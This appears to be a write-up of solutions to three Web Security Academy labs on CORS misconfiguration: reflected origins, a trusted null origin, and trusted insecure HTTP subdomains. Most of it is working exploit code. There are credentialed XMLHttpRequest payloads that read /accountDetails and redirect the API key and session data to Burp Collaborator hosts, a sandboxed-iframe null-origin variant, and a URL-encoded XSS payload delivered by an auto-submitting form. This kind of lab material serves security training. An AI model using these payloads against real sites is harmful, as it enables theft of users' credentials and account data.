# Lab: CORS vulnerability with basic origin reflection

The first thing we need is to find out which resources wwill return the "Access-Control-Allow-Credentials" or "Access-Control-Allow-Origin" in order to exploit this acceptence and retrieve the admin's API key. After looking around we find that the /accountDetails return the desired cookies:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://exploit-ac991f221e40a77180f10053017a009a.web-security-academy.net
Access-Control-Allow-Credentials: true

{
  "username": "wiener",
  "email": "",
  "apikey": "bTAkQD1TJZNEwe4addvO8IXN6E0Mkbma",
  "sessions": [
    "NHIGZYXE99Hknr9RSxVwgks0Pglm8RXC"
  ]
}
```
Next we need to use this in order to relax the SOP machanism. This can be done by sending this request before the API key read like so:
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://ace81f9f1ed1a796808c002f00de003e.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();


function reqListener() {
location='//sjfwiq40ukmy29m2y3kxopepsgy7mw.burpcollaborator.net/log?key='+this.responseText;
};
</script>
```

# Lab: CORS vulnerability with trusted null origin

Note that if we send the accountDetails with Origin: null we get:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

{
  "username": "wiener",
  "email": "",
  "apikey": "7N5RtvnH051NW4AUKG1t0Op95F7tjsUw",
  "sessions": [
    "zj6zHj1zvowaydhulr1xD87JEoTtWwKd"
  ]
}
```

:Using the Iframe technique to execute the call to accountDetails with an Origin: null in order to get the relaxation for SOP:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acf01f931f1adfe380c04890007200bb.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://vqplle5qte9nzasa3mi75wk1rsxkl9.burpcollaborator.net/log?key='+this.responseText;
};</script>"></iframe>
```

# Lab: CORS vulnerability with trusted insecure protocols

We first need to find the MITM target to insert our script to. Note that the check stock request is for HTTP and is vulnerable to XSS (productId can be html and it will be embedded in the page).
We then construct the script that the victim's browser will execute (from a valid origin and CORS) like so:

```html
<script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','https://ac7e1f0b1fc1ccd980822389001000f7.web-security-academy.net/accountDetails',true);req.withCredentials = true;req.send();function reqListener() {location='http://69dxye6i0e0v66jydjfhs1rxmosfg4.burpcollaborator.net/log?key='+this.responseText;};</script>
```
Encoded to:
```http
%3c%73%63%72%69%70%74%3e%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%61%63%37%65%31%66%30%62%31%66%63%31%63%63%64%39%38%30%38%32%32%33%38%39%30%30%31%30%30%30%66%37%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%72%65%71%2e%73%65%6e%64%28%29%3b%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%36%39%64%78%79%65%36%69%30%65%30%76%36%36%6a%79%64%6a%66%68%73%31%72%78%6d%6f%73%66%67%34%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%6c%6f%67%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%7d%3b%3c%2f%73%63%72%69%70%74%3e
```
Now we can construct the html for the victim that will trigger our request for the API from the user with the right CORS creds. The final HTML is:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://stock.ac7e1f0b1fc1ccd980822389001000f7.web-security-academy.net/">
      <input type="hidden" name="productId" value="&lt;script&gt;var&#32;req&#32;&#61;&#32;new&#32;XMLHttpRequest&#40;&#41;&#59;req&#46;onload&#32;&#61;&#32;reqListener&#59;req&#46;open&#40;&apos;get&apos;&#44;&apos;https&#58;&#47;&#47;ac7e1f0b1fc1ccd980822389001000f7&#46;web&#45;security&#45;academy&#46;net&#47;accountDetails&apos;&#44;true&#41;&#59;req&#46;withCredentials&#32;&#61;&#32;true&#59;req&#46;send&#40;&#41;&#59;function&#32;reqListener&#40;&#41;&#32;&#123;location&#61;&apos;http&#58;&#47;&#47;69dxye6i0e0v66jydjfhs1rxmosfg4&#46;burpcollaborator&#46;net&#47;log&#63;key&#61;&apos;&#43;this&#46;responseText&#59;&#125;&#59;&lt;&#47;script&gt;" />
      <input type="hidden" name="storeId" value="1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
